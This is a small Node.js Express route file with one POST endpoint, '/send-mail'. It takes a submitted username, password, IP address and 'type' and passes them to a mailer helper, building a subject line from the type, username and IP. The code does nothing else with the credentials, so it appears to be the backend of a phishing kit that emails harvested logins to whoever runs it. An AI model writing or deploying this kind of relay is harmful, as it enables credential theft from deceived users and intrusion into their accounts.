const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    const { username, pass, ip, type } = req.body;

    if (!username || !pass) {
        return res.status(400).send({ response: 'failed', error: 'Missing username or password' });
    }

    mailer.sendEmail(res, `${type}: ${username}: ${ip}`, username, pass, ip, type);
});

module.exports = router;
